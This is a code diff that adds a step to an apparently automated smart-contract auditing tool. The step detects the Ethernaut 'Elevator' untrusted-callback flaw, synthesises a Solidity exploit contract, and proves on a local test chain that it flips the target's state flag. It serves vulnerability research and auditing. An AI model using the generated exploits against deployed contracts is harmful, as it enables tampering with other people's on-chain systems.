@@ -2155,6 +2155,140 @@ def _synth_king_dos(name, target_src, invariants_src, manifest, scan_step, t0):
             "ms":int((time.time()-t0)*1000)}
 
 
+def _synth_callback_inconsistency(name, target_src, invariants_src, manifest, scan_step, t0):
+    """Ethernaut Elevator 류: 타깃이 외부 인터페이스(대개 msg.sender 캐스팅)의
+    bool 반환 메서드를 한 함수 안에서 두 번 호출해 분기·상태전이를 결정한다. 공격
+    컨트랙트가 그 메서드를 호출마다 다른 값(false→true)으로 구현하면, 정직한 구현이라면
+    불가능한 상태 플래그(top 등) 반전을 강제할 수 있다. 플래그가 실제 뒤집히는지로 증명."""
+    import solcx
+    from web3 import Web3
+    strip = _strip_comments(target_src)
+    bodies = _contract_bodies(strip)
+    if name not in bodies:
+        return None
+    tb = bodies[name]
+    # bool 반환 메서드를 가진 인터페이스
+    cand = []
+    for im in re.finditer(r"interface\s+(\w+)\s*\{([^}]*)\}", strip):
+        iname, ibody = im.group(1), im.group(2)
+        fm = re.search(r"function\s+(\w+)\s*\(([^)]*)\)[^;]*\breturns\s*\(\s*bool", ibody)
+        if fm:
+            cand.append((iname, fm.group(1), fm.group(2).strip()))
+    for iname, mname, margs in cand:
+        # 타깃이 IName(msg.sender) 를 만들고 mname 을 2회 이상 호출하며 상태 bool 을 세팅?
+        if not re.search(re.escape(iname) + r"\s*\(\s*msg\.sender\s*\)", tb):
+            continue
+        # 진입 함수 f: 본문에 IName(msg.sender) 와 .mname( 2회 이상, 상태 bool 대입 포함
+        f = None; boolvar = None
+        for fn in _functions(tb):
+            b = fn["body"]
+            if re.search(re.escape(iname) + r"\s*\(\s*msg\.sender\s*\)", b) \
+                    and len(re.findall(r"\.\s*" + re.escape(mname) + r"\s*\(", b)) >= 2:
+                am = re.search(r"(\w+)\s*=\s*[\w.]*\.\s*" + re.escape(mname) + r"\s*\(", b)
+                if am:
+                    f, boolvar = fn["name"], am.group(1); break
+        if not f or not boolvar:
+            continue
+        if _slot_index(tb, boolvar) is None:
+            continue
+        # attacker: mname 을 호출마다 false→true 로 구현
+        def _decls(argstr):
+            out = []
+            for i, part in enumerate(x.strip() for x in argstr.split(",") if x.strip()):
+                ty = part.split()[0]
+                mem = " memory" if (ty in ("string", "bytes") or ty.endswith("[]")) else ""
+                out.append(f"{ty}{mem} p{i}")
+            return ", ".join(out)
+        mdecl = _decls(margs)
+        _solcv, _evm = _solc_for(target_src)
+        std0 = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src}},
+                "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
+        try:
+            c0 = solcx.compile_standard(std0, allow_empty=True)
+        except Exception:
+            return None
+        tabi = None
+        for _fl, cs in c0.get("contracts", {}).items():
+            for cn, c in cs.items():
+                if cn == name: tabi = c["abi"]
+        if tabi is None or not _has_getter(tabi, boolvar):
+            continue
+        ftypes = None
+        for e in tabi:
+            if e.get("type") == "function" and e.get("name") == f:
+                ftypes = [i["type"] for i in e.get("inputs", [])]; break
+        if ftypes is None:
+            continue
+        def _lit(t):
+            if t == "address": return "address(this)"
+            if t == "bool": return "false"
+            if t.startswith("uint") or t.startswith("int"): return "1"
+            if re.fullmatch(r"bytes\d+", t): return f"bytes{t[5:]}(0)"
+            if t == "bytes": return "hex\"\""
+            if t == "string": return "\"\""
+            return "0"
+        fargs = ", ".join(_lit(t) for t in ftypes)
+        pwn_src = (HEADER +
+            f"interface IT {{ function {f}({', '.join(ftypes)}) external; }}\n"
+            "contract Pwn {\n"
+            "    uint256 _c;\n"
+            f"    function {mname}({mdecl}) external returns (bool) {{ _c += 1; return (_c % 2) == 0; }}\n"
+            f"    function run(address t) external payable {{ IT(t).{f}({fargs}); }}\n"
+            "}\n")
+        std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src},"Pwn.sol":{"content":pwn_src}},
+               "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
+        try:
+            compiled = solcx.compile_standard(std, allow_empty=True)
+        except Exception:
+            continue
+        arts = {}
+        for _fl, cs in compiled.get("contracts", {}).items():
+            for cn, c in cs.items():
+                arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
+        if name not in arts or "Pwn" not in arts:
+            continue
+        abi = arts[name]["abi"]
+        w3, acct = _mk_evm()
+        def dep(cn, args):
+            C = w3.eth.contract(abi=arts[cn]["abi"], bytecode=arts[cn]["bin"])
+            r = w3.eth.wait_for_transaction_receipt(C.constructor(*args).transact({"from":acct,"gas":12_000_000}))
+            return r.contractAddress
+        try:
+            taddr = dep(name, [_default_for_type(t) for t in _abi_ctor_types(abi)])
+            paddr = dep("Pwn", [])
+        except Exception:
+            continue
+        tc = w3.eth.contract(address=taddr, abi=abi)
+        try:
+            if tc.functions[boolvar]().call() is not False:
+                continue  # 이미 true 면 증명 아님
+        except Exception:
+            continue
+        pwn = w3.eth.contract(address=paddr, abi=arts["Pwn"]["abi"])
+        try:
+            pwn.functions.run(taddr).transact({"from":acct,"gas":5_000_000})
+        except Exception:
+            continue
+        if tc.functions[boolvar]().call() is not True:
+            continue
+        poc = (HEADER +
+            "// Strategy: untrusted callback inconsistency (Ethernaut Elevator). The target\n"
+            f"// calls {iname}(msg.sender).{mname}(...) twice and trusts both returns. Pwn\n"
+            f"// returns false then true, flipping the state flag `{boolvar}`.\n"
+            f"interface IT {{ function {f}({', '.join(ftypes)}) external; }}\n"
+            "contract Exploit {\n"
+            "    uint256 _c;\n"
+            f"    function {mname}({mdecl}) external returns (bool) {{ _c += 1; return (_c % 2) == 0; }}\n"
+            f"    function run(address t) external payable {{ IT(t).{f}({fargs}); }}\n"
+            "    receive() external payable {}\n}\n")
+        gen = {"step":"generate","title":"Exploit.sol 생성 (callback-inconsistency)","strategy":"callback-inconsistency","exploit_src":poc}
+        return {"name":name,"proven":True,"firstViolated":f"state flag '{boolvar}' flipped via untrusted callback",
+                "strategy":f"callback-inconsistency:{f}","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
+                "note":"외부 콜백을 두 번 신뢰하는 분기를 false→true 반환으로 조작해 상태 플래그를 반전시켰습니다.",
+                "ms":int((time.time()-t0)*1000)}
+    return None
+
+
 def _multiblock_attempt(name, target_src, invariants_src, manifest, scan_step, t0):
     """다중 블록 러너: 블록 엔트로피로 결과가 정해지는 게임(예: CoinFlip)에서,
     소스의 결과식을 복제한 공격 컨트랙트를 배포하고 블록을 넘기며 매 블록 올바른
@@ -2510,6 +2644,13 @@ def _fuzz_fallback(name, target_src, invariants_src, manifest, do_verify, scan_s
     # 0h) 그리핑 DoS (예: King — revert-receive 로 특권 역할 영구 락)
     try:
         r = _synth_king_dos(name, target_src, invariants_src, manifest, scan_step, t0)
+        if r:
+            return r
+    except Exception:
+        pass
+    # 0i) 콜백 반환 불일치 (예: Elevator — 외부 콜백 두 번 신뢰)
+    try:
+        r = _synth_callback_inconsistency(name, target_src, invariants_src, manifest, scan_step, t0)
         if r:
             return r
     except Exception:
